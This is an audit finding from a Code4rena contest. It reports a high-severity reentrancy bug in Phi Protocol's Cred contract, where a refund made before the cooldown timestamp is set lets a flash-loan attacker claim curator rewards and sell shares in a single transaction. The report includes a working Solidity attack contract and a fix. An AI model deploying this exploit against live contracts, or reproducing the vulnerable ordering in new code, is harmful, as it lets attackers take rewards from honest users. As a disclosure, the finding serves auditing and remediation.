# H-02 | Reentrancy Vulnerability Allows Bypass of Cooldown, Leading to Unfair Reward Extraction Through Flash Loan

**Author:** HailTheLord
**Protocol:** Phi
Proof Link: https://github.com/code-423n4/2024-08-phi-findings/issues/25
**Severity:** High  
**Category:** Reentrancy  
**Type:** Reentrancy (State Update After External Call)  
**Protocol:** Phi Protocol  
**Submitted via:** Code4rena  

## Summary

The `_handleTrade` function in the `Cred` contract updates `lastTradeTimestamp` **after** refunding excess ETH. This ordering allows a reentrancy attack via the `receive()` fallback. An attacker can use a flash loan to buy shares, re-enter during the refund to call `distribute()` + `sellShareCred()`, bypass the cooldown, and extract curator rewards unfairly.

## Vulnerability Details

The `buyShareCred` function calls `_handleTrade`, which performs the following sequence when `isBuy == true`:

```solidity
function _handleTrade(...) internal {
    ...
    _updateCuratorShareBalance(credId_, curator_, amount_, isBuy);

    if (isBuy) {
        cred.currentSupply += amount_;
        uint256 excessPayment = msg.value - price - protocolFee - creatorFee;

        if (excessPayment > 0) {
            _msgSender().safeTransferETH(excessPayment);           // ← External call (reentrancy point)
        }

        lastTradeTimestamp[credId_][curator_] = block.timestamp;   // ← State update AFTER external call
    }
    ...
}
```

The cooldown check in `sellShareCred` relies on `lastTradeTimestamp`. Because the timestamp is updated **after** the ETH transfer, an attacker can re-enter during the refund and sell immediately.

### Attack Scenario

1. Attacker takes a flash loan and calls `buyShareCred` with a large number of shares + deliberate overpayment (to trigger refund).
2. During the `safeTransferETH` refund, the attacker's `receive()` fallback is triggered.
3. Inside `receive()`, the attacker:
   - Calls `CuratorRewardsDistributor.distribute(credId)` to claim rewards based on newly acquired shares.
   - Immediately calls `sellShareCred()` to dump the shares.
4. The original `buyShareCred` transaction completes and updates `lastTradeTimestamp` too late.
5. Attacker successfully bypasses the cooldown and extracts the majority of curator rewards in one atomic transaction.

## Impact

- **Unfair Reward Extraction**: Attackers can capture curator rewards without respecting the intended staking/cooldown period.
- **Loss for Legitimate Users**: Honest curators/shareholders lose out on rewards they are entitled to.
- **Trust Erosion**: The cooldown mechanism, explicitly designed to prevent flash-loan reward sniping, is completely bypassed.
- **High Likelihood**: The attack works on any `cred` as long as rewards are available and profit exceeds flash loan + gas costs.

## Proof of Concept

The warden provided a Foundry test + `AttackContract` that demonstrates the full attack in a single transaction.

### Key AttackContract (simplified)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import { Cred } from "../../src/Cred.sol";
import { CuratorRewardsDistributor } from "../../src/reward/CuratorRewardsDistributor.sol";
import { PhiRewards } from "../../src/reward/PhiRewards.sol";

contract AttackContract {
    Cred credContract;
    CuratorRewardsDistributor CRDContract;
    PhiRewards PhiRewardsContract;
    bool notActive = true;

    constructor(address _cred, address _curatorRewardsDistributor, address _phiRewards) {
        credContract = Cred(_cred);
        CRDContract = CuratorRewardsDistributor(_curatorRewardsDistributor);
        PhiRewardsContract = PhiRewards(_phiRewards);
    }

    function buy(uint256 _amount, uint256 _buyPrice) public {
        // Overpay deliberately to trigger refund + reentrancy
        credContract.buyShareCred{ value: _buyPrice + 0.01 ether }(1, _amount, 0);
    }

    receive() external payable {
        if (notActive) {
            notActive = false;
            CRDContract.distribute(1);                                    // Claim rewards
            credContract.sellShareCred(1, credContract.getShareNumber(1, address(this)), 0); // Dump shares
            PhiRewardsContract.withdraw(address(this), 0);                // Withdraw rewards
        }
    }
}
```

The test shows the attack contract ending with a profit (~0.83 ETH in the example) after performing the full buy → distribute → sell → claim cycle in one transaction.

## Recommendation

**Update `lastTradeTimestamp` before making any external calls or refunds.**

```diff
if (isBuy) {
    cred.currentSupply += amount_;
+   lastTradeTimestamp[credId_][curator_] = block.timestamp;   // Move BEFORE refund

    uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
    if (excessPayment > 0) {
        _msgSender().safeTransferETH(excessPayment);
    }
-   lastTradeTimestamp[credId_][curator_] = block.timestamp;
}
```

**Additional Mitigations:**
- Consider using the **Checks-Effects-Interactions** pattern more strictly.
- Add a `nonReentrant` modifier on `buyShareCred` / `sellShareCred` if not already present.
- Alternatively, use a pull-payment pattern for refunds instead of direct `safeTransferETH`.

---

**Status:** Open  
**Tags:** `#reentrancy` `#cooldown` `#flash-loan` `#reward-distribution` `#high-severity`
